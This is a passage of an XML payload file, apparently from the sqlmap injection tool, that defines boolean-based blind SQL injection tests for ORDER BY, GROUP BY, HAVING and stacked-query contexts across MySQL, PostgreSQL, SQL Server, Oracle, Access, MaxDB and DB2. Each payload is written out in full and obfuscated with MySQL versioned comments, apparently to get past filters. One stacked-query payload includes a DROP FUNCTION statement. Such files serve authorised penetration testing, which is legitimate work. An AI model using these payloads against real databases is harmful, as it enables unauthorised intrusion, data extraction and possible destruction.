            <dbms>MySQL</dbms>
            <dbms_version>&lt; 5.0</dbms_version>
        </details>
    </test>

    <test>
        <title>PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause</title>
        <stype>1</stype>
        <level>2</level>
        <risk>1</risk>
        <clause>2,3</clause>
        <where>1</where>
        <vector>,(SELECT (CASE WHEN ([INFERENCE]) THEN 1 ELSE 1/(SELECT 0) END))</vector>
        <request>
            <payload>,(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/) /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ /*!500001/**_**/*//(/*!50000SELECT/**_**/*/ /*!500000/**_**/*/) /*!50000END/**_**/*/))</payload>
        </request>
        <response>
            <comparison>,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE 1/(SELECT 0) END))</comparison>
        </response>
        <details>
            <dbms>PostgreSQL</dbms>
        </details>
    </test>

    <!-- It exclusively works with ORDER BY -->
    <test>
        <title>PostgreSQL boolean-based blind - ORDER BY clause (original value)</title>
        <stype>1</stype>
        <level>4</level>
        <risk>1</risk>
        <clause>3</clause>
        <where>1</where>
        <vector>,(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE 1/(SELECT 0) END))</vector>
        <request>
            <payload>,(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/) /*!50000THEN/**_**/*/ [/*!50000ORIGVALUE/**_**/*/] /*!50000ELSE/**_**/*/ /*!500001/**_**/*//(/*!50000SELECT/**_**/*/ /*!500000/**_**/*/) /*!50000END/**_**/*/))</payload>
        </request>
        <response>
            <comparison>,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE 1/(SELECT 0) END))</comparison>
        </response>
        <details>
            <dbms>PostgreSQL</dbms>
        </details>
    </test>

    <!--
         TODO: this would work for GROUP BY too if sqlmap did not enclose string-based [ORIGVALUE] with single quotes, but then other payloads would break.
               It already works for ORDER BY because it accepts int whereas GROUP BY only accepts format [table].[column] so [ORIGVALUE] must where it is
    -->
    <test>
        <!-- <title>PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause (GENERATE_SERIES - original value)</title> -->
        <title>PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)</title>
        <stype>1</stype>
        <level>5</level>
        <risk>1</risk>
        <!-- <clause>2,3</clause> -->
        <clause>3</clause>
        <where>1</where>
        <vector>,(SELECT * FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([INFERENCE]) THEN 1 ELSE 0 END) LIMIT 1)</vector>
        <request>
            <payload>,(/*!50000SELECT/**_**/*/ * /*!50000FROM/**_**/*/ /*!50000GENERATE_SERIES/**_**/*/(/*!50000[RANDNUM]/**_**/*/,/*!50000[RANDNUM]/**_**/*/,/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/) /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ /*!500000/**_**/*/ /*!50000END/**_**/*/) /*!50000LIMIT/**_**/*/ /*!500001/**_**/*/)</payload>
        </request>
        <response>
            <comparison>,(SELECT * FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE 0 END) LIMIT 1)</comparison>
        </response>
        <details>
            <dbms>PostgreSQL</dbms>
        </details>
    </test>

    <test>
        <title>Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause</title>
        <stype>1</stype>
        <level>3</level>
        <risk>1</risk>
        <clause>3</clause>
        <where>1</where>
        <vector>,(SELECT (CASE WHEN ([INFERENCE]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))</vector>
        <request>
            <payload>,(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/) /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ /*!50000[RANDNUM]/**_**/*/*(/*!50000SELECT/**_**/*/ /*!50000[RANDNUM]/**_**/*/ /*!50000UNION/**_**/*/ /*!50000ALL/**_**/*/ /*!50000SELECT/**_**/*/ [/*!50000RANDNUM1/**_**/*/]) /*!50000END/**_**/*/))</payload>
        </request>
        <response>
            <comparison>,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))</comparison>
        </response>
        <details>
            <dbms>Microsoft SQL Server</dbms>
            <dbms>Sybase</dbms>
        </details>
    </test>

    <test>
        <title>Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)</title>
        <stype>1</stype>
        <level>4</level>
        <risk>1</risk>
        <clause>3</clause>
        <where>1</where>
        <vector>,(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))</vector>
        <request>
            <payload>,(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/) /*!50000THEN/**_**/*/ [/*!50000ORIGVALUE/**_**/*/] /*!50000ELSE/**_**/*/ /*!50000[RANDNUM]/**_**/*/*(/*!50000SELECT/**_**/*/ /*!50000[RANDNUM]/**_**/*/ /*!50000UNION/**_**/*/ /*!50000ALL/**_**/*/ /*!50000SELECT/**_**/*/ [/*!50000RANDNUM1/**_**/*/]) /*!50000END/**_**/*/))</payload>
        </request>
        <response>
            <comparison>,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))</comparison>
        </response>
        <details>
            <dbms>Microsoft SQL Server</dbms>
            <dbms>Sybase</dbms>
        </details>
    </test>

    <test>
        <title>Oracle boolean-based blind - ORDER BY, GROUP BY clause</title>
        <stype>1</stype>
        <level>3</level>
        <risk>1</risk>
        <clause>2,3</clause>
        <where>1</where>
        <vector>,(SELECT (CASE WHEN ([INFERENCE]) THEN 1 ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)</vector>
        <request>
            <payload>,(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/) /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ /*!50000CAST/**_**/*/(/*!500001/**_**/*/ /*!50000AS/**_**/*/ /*!50000INT/**_**/*/)/(/*!50000SELECT/**_**/*/ /*!500000/**_**/*/ /*!50000FROM/**_**/*/ /*!50000DUAL/**_**/*/) /*!50000END/**_**/*/) /*!50000FROM/**_**/*/ /*!50000DUAL/**_**/*/)</payload>
        </request>
        <response>
            <comparison>,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)</comparison>
        </response>
        <details>
            <dbms>Oracle</dbms>
        </details>
    </test>

    <test>
        <title>Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value)</title>
        <stype>1</stype>
        <level>4</level>
        <risk>1</risk>
        <clause>2,3</clause>
        <where>1</where>
        <vector>,(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)</vector>
        <request>
            <payload>,(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/) /*!50000THEN/**_**/*/ [/*!50000ORIGVALUE/**_**/*/] /*!50000ELSE/**_**/*/ /*!50000CAST/**_**/*/(/*!500001/**_**/*/ /*!50000AS/**_**/*/ /*!50000INT/**_**/*/)/(/*!50000SELECT/**_**/*/ /*!500000/**_**/*/ /*!50000FROM/**_**/*/ /*!50000DUAL/**_**/*/) /*!50000END/**_**/*/) /*!50000FROM/**_**/*/ /*!50000DUAL/**_**/*/)</payload>
        </request>
        <response>
            <comparison>,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)</comparison>
        </response>
        <details>
            <dbms>Oracle</dbms>
        </details>
    </test>

    <test>
        <title>Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause</title>
        <stype>1</stype>
        <level>4</level>
        <risk>1</risk>
        <clause>2,3</clause>
        <where>1</where>
        <vector>,IIF([INFERENCE],1,1/0)</vector>
        <request>
            <payload>,/*!50000IIF/**_**/*/(/*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/,/*!500001/**_**/*/,/*!500001/**_**/*///*!500000/**_**/*/)</payload>
        </request>
        <response>
            <comparison>,IIF([RANDNUM]=[RANDNUM1],1,1/0)</comparison>
        </response>
        <details>
            <dbms>Microsoft Access</dbms>
        </details>
    </test>

    <test>
        <title>Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value)</title>
        <stype>1</stype>
        <level>5</level>
        <risk>1</risk>
        <clause>2,3</clause>
        <where>1</where>
        <vector>,IIF([INFERENCE],[ORIGVALUE],1/0)</vector>
        <request>
            <payload>,/*!50000IIF/**_**/*/(/*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/,[/*!50000ORIGVALUE/**_**/*/],/*!500001/**_**/*///*!500000/**_**/*/)</payload>
        </request>
        <response>
            <comparison>,IIF([RANDNUM]=[RANDNUM1],[ORIGVALUE],1/0)</comparison>
        </response>
        <details>
            <dbms>Microsoft Access</dbms>
        </details>
    </test>

    <test>
        <title>SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause</title>
        <stype>1</stype>
        <level>4</level>
        <risk>1</risk>
        <clause>2,3</clause>
        <where>1</where>
        <vector>,(CASE WHEN [INFERENCE] THEN 1 ELSE NULL END)</vector>
        <request>
            <payload>,(/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ /*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/ /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ /*!50000NULL/**_**/*/ /*!50000END/**_**/*/)</payload>
        </request>
        <response>
            <comparison>,(CASE WHEN [RANDNUM]=[RANDNUM1] THEN 1 ELSE NULL END)</comparison>
        </response>
        <details>
            <dbms>SAP MaxDB</dbms>
        </details>
    </test>

    <test>
        <title>SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause (original value)</title>
        <stype>1</stype>
        <level>5</level>
        <risk>1</risk>
        <clause>2,3</clause>
        <where>1</where>
        <vector>,(CASE WHEN [INFERENCE] THEN [ORIGVALUE] ELSE NULL END)</vector>
        <request>
            <payload>,(/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ /*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/ /*!50000THEN/**_**/*/ [/*!50000ORIGVALUE/**_**/*/] /*!50000ELSE/**_**/*/ /*!50000NULL/**_**/*/ /*!50000END/**_**/*/)</payload>
        </request>
        <response>
            <comparison>,(CASE WHEN [RANDNUM]=[RANDNUM1] THEN [ORIGVALUE] ELSE NULL END)</comparison>
        </response>
        <details>
            <dbms>SAP MaxDB</dbms>
        </details>
    </test>

    <test>
        <title>IBM DB2 boolean-based blind - ORDER BY clause</title>
        <stype>1</stype>
        <level>4</level>
        <risk>1</risk>
        <clause>3</clause>
        <where>1</where>
        <vector>,(SELECT CASE WHEN [INFERENCE] THEN 1 ELSE RAISE_ERROR(70001, '[RANDSTR]') END FROM SYSIBM.SYSDUMMY1)</vector>
        <request>
            <payload>,(/*!50000SELECT/**_**/*/ /*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ /*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/ /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ /*!50000RAISE_ERROR/**_**/*/(/*!5000070001/**_**/*/, '[/*!50000RANDSTR/**_**/*/]') /*!50000END/**_**/*/ /*!50000FROM/**_**/*/ /*!50000SYSIBM/**_**/*/./*!50000SYSDUMMY1/**_**/*/)</payload>
        </request>
        <response>
            <comparison>,(SELECT CASE WHEN [RANDNUM]=[RANDNUM1] THEN 1 ELSE RAISE_ERROR(70001, '[RANDSTR]') END FROM SYSIBM.SYSDUMMY1)</comparison>
        </response>
        <details>
            <dbms>IBM DB2</dbms>
        </details>
    </test>

    <test>
        <title>IBM DB2 boolean-based blind - ORDER BY clause (original value)</title>
        <stype>1</stype>
        <level>5</level>
        <risk>1</risk>
        <clause>3</clause>
        <where>1</where>
        <vector>,(SELECT CASE WHEN [INFERENCE] THEN [ORIGVALUE] ELSE RAISE_ERROR(70001, '[RANDSTR]') END FROM SYSIBM.SYSDUMMY1)</vector>
        <request>
            <payload>,(/*!50000SELECT/**_**/*/ /*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ /*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/ /*!50000THEN/**_**/*/ [/*!50000ORIGVALUE/**_**/*/] /*!50000ELSE/**_**/*/ /*!50000RAISE_ERROR/**_**/*/(/*!5000070001/**_**/*/, '[/*!50000RANDSTR/**_**/*/]') /*!50000END/**_**/*/ /*!50000FROM/**_**/*/ /*!50000SYSIBM/**_**/*/./*!50000SYSDUMMY1/**_**/*/)</payload>
        </request>
        <response>
            <comparison>,(SELECT CASE WHEN [RANDNUM]=[RANDNUM1] THEN [ORIGVALUE] ELSE RAISE_ERROR(70001, '[RANDSTR]') END FROM SYSIBM.SYSDUMMY1)</comparison>
        </response>
        <details>
            <dbms>IBM DB2</dbms>
        </details>
    </test>

    <!-- Works in MySQL, Oracle, etc. -->
    <test>
        <title>HAVING boolean-based blind - WHERE, GROUP BY clause</title>
        <stype>1</stype>
        <level>3</level>
        <risk>1</risk>
        <clause>1,2</clause>
        <where>1</where>
        <vector>HAVING [INFERENCE]</vector>
        <request>
            <payload>/*!50000HAVING/**_**/*/ /*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/</payload>
        </request>
        <response>
            <comparison>HAVING [RANDNUM]=[RANDNUM1]</comparison>
        </response>
    </test>
    <!-- End of boolean-based blind tests - ORDER BY, GROUP BY clause -->

    <!-- Boolean-based blind tests - Stacked queries -->
    <test>
        <title>MySQL &gt;= 5.0 boolean-based blind - Stacked queries</title>
        <stype>1</stype>
        <level>4</level>
        <risk>1</risk>
        <clause>1-8</clause>
        <where>1</where>
        <vector>;SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END)</vector>
        <request>
            <payload>;/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/) /*!50000THEN/**_**/*/ /*!50000[RANDNUM]/**_**/*/ /*!50000ELSE/**_**/*/ /*!50000[RANDNUM]/**_**/*/*(/*!50000SELECT/**_**/*/ /*!50000[RANDNUM]/**_**/*/ /*!50000FROM/**_**/*/ /*!50000INFORMATION_SCHEMA/**_**/*/./*!50000PLUGINS/**_**/*/) /*!50000END/**_**/*/)</payload>
            <comment>#</comment>
        </request>
        <response>
            <comparison>;SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END)</comparison>
        </response>
        <details>
            <dbms>MySQL</dbms>
            <dbms_version>&gt;= 5.0</dbms_version>
        </details>
    </test>

    <test>
        <title>MySQL &lt; 5.0 boolean-based blind - Stacked queries</title>
        <stype>1</stype>
        <level>5</level>
        <risk>1</risk>
        <clause>1-8</clause>
        <where>1</where>
        <vector>;SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END)</vector>
        <request>
            <payload>;/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/) /*!50000THEN/**_**/*/ /*!50000[RANDNUM]/**_**/*/ /*!50000ELSE/**_**/*/ /*!50000[RANDNUM]/**_**/*/*(/*!50000SELECT/**_**/*/ /*!50000[RANDNUM]/**_**/*/ /*!50000FROM/**_**/*/ /*!50000INFORMATION_SCHEMA/**_**/*/./*!50000PLUGINS/**_**/*/) /*!50000END/**_**/*/)</payload>
            <comment>#</comment>
        </request>
        <response>
            <comparison>;SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END)</comparison>
        </response>
        <details>
            <dbms>MySQL</dbms>
            <dbms_version>&lt; 5.0</dbms_version>
        </details>
    </test>

    <test>
        <title>PostgreSQL boolean-based blind - Stacked queries</title>
        <stype>1</stype>
        <level>3</level>
        <risk>1</risk>
        <clause>1-8</clause>
        <where>1</where>
        <vector>;SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE 1/(SELECT 0) END)</vector>
        <request>
            <payload>;/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/) /*!50000THEN/**_**/*/ /*!50000[RANDNUM]/**_**/*/ /*!50000ELSE/**_**/*/ /*!500001/**_**/*//(/*!50000SELECT/**_**/*/ /*!500000/**_**/*/) /*!50000END/**_**/*/)</payload>
            <comment>--</comment>
        </request>
        <response>
            <comparison>;SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE 1/(SELECT 0) END)</comparison>
        </response>
        <details>
            <dbms>PostgreSQL</dbms>
        </details>
    </test>

    <!-- Because of the syntax of GENERATE_SERIES() function, the 'then' condition must be 1, do not change it -->
    <test>
        <title>PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)</title>
        <stype>1</stype>
        <level>5</level>
        <risk>1</risk>
        <clause>1-8</clause>
        <where>1</where>
        <vector>;SELECT * FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([INFERENCE]) THEN 1 ELSE 0 END) LIMIT 1</vector>
        <request>
            <payload>;/*!50000SELECT/**_**/*/ * /*!50000FROM/**_**/*/ /*!50000GENERATE_SERIES/**_**/*/(/*!50000[RANDNUM]/**_**/*/,/*!50000[RANDNUM]/**_**/*/,/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/) /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ /*!500000/**_**/*/ /*!50000END/**_**/*/) /*!50000LIMIT/**_**/*/ /*!500001/**_**/*/</payload>
            <comment>--</comment>
        </request>
        <response>
            <comparison>;SELECT * FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE 0 END) LIMIT 1</comparison>
        </response>
        <details>
            <dbms>PostgreSQL</dbms>
        </details>
    </test>

    <test>
        <title>Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)</title>
        <stype>1</stype>
        <level>3</level>
        <risk>1</risk>
        <clause>1-8</clause>
        <where>1</where>
        <vector>;IF([INFERENCE]) SELECT [RANDNUM] ELSE DROP FUNCTION [RANDSTR]</vector>
        <request>
            <payload>;/*!50000IF/**_**/*/(/*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/) /*!50000SELECT/**_**/*/ /*!50000[RANDNUM]/**_**/*/ /*!50000ELSE/**_**/*/ /*!50000DROP/**_**/*/ /*!50000FUNCTION/**_**/*/ [/*!50000RANDSTR/**_**/*/]</payload>
            <comment>--</comment>
        </request>
        <response>
            <comparison>;IF([RANDNUM]=[RANDNUM1]) SELECT [RANDNUM] ELSE DROP FUNCTION [RANDSTR]</comparison>
        </response>
        <details>
            <dbms>Microsoft SQL Server</dbms>
            <dbms>Sybase</dbms>
        </details>
    </test>

    <test>
        <title>Microsoft SQL Server/Sybase boolean-based blind - Stacked queries</title>
        <stype>1</stype>
        <level>4</level>
        <risk>1</risk>
        <clause>1-8</clause>
        <where>1</where>
        <vector>;SELECT (CASE WHEN ([INFERENCE]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END)</vector>
        <request>
            <payload>;/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/) /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ /*!50000[RANDNUM]/**_**/*/*(/*!50000SELECT/**_**/*/ /*!50000[RANDNUM]/**_**/*/ /*!50000UNION/**_**/*/ /*!50000ALL/**_**/*/ /*!50000SELECT/**_**/*/ [/*!50000RANDNUM1/**_**/*/]) /*!50000END/**_**/*/)</payload>
            <comment>--</comment>
        </request>
        <response>
            <comparison>;SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END)</comparison>
        </response>
        <details>
            <dbms>Microsoft SQL Server</dbms>
            <dbms>Sybase</dbms>
        </details>
    </test>

    <test>
        <title>Oracle boolean-based blind - Stacked queries</title>
        <stype>1</stype>
        <level>4</level>
        <risk>1</risk>
        <clause>1-8</clause>
        <where>1</where>
        <vector>;SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL</vector>
        <request>
            <payload>;/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ (/*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/) /*!50000THEN/**_**/*/ /*!50000[RANDNUM]/**_**/*/ /*!50000ELSE/**_**/*/ /*!50000CAST/**_**/*/(/*!500001/**_**/*/ /*!50000AS/**_**/*/ /*!50000INT/**_**/*/)/(/*!50000SELECT/**_**/*/ /*!500000/**_**/*/ /*!50000FROM/**_**/*/ /*!50000DUAL/**_**/*/) /*!50000END/**_**/*/) /*!50000FROM/**_**/*/ /*!50000DUAL/**_**/*/</payload>
            <comment>--</comment>
        </request>
        <response>
            <comparison>;SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL</comparison>
        </response>
        <details>
            <dbms>Oracle</dbms>
        </details>
    </test>

    <test>
        <title>Microsoft Access boolean-based blind - Stacked queries</title>
        <stype>1</stype>
        <level>5</level>
        <risk>1</risk>
        <clause>1-8</clause>
        <where>1</where>
        <vector>;IIF([INFERENCE],1,1/0)</vector>
        <request>
            <payload>;/*!50000IIF/**_**/*/(/*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/,/*!500001/**_**/*/,/*!500001/**_**/*///*!500000/**_**/*/)</payload>
            <comment>%16</comment>
        </request>
        <response>
            <comparison>;IIF([RANDNUM]=[RANDNUM1],1,1/0)</comparison>
        </response>
        <details>
            <dbms>Microsoft Access</dbms>
        </details>
    </test>

    <test>
        <title>SAP MaxDB boolean-based blind - Stacked queries</title>
        <stype>1</stype>
        <level>5</level>
        <risk>1</risk>
        <clause>1-8</clause>
        <where>1</where>
        <vector>;SELECT CASE WHEN [INFERENCE] THEN 1 ELSE NULL END</vector>
        <request>
            <payload>;/*!50000SELECT/**_**/*/ /*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ /*!50000[RANDNUM]/**_**/*/=/*!50000[RANDNUM]/**_**/*/ /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ /*!50000NULL/**_**/*/ /*!50000END/**_**/*/</payload>
            <comment>--</comment>
        </request>
        <response>
            <comparison>;SELECT CASE WHEN [RANDNUM]=[RANDNUM1] THEN 1 ELSE NULL END</comparison>
        </response>
        <details>
            <dbms>SAP MaxDB</dbms>
        </details>
    </test>
    <!-- End of boolean-based blind tests - Stacked queries -->
</root>
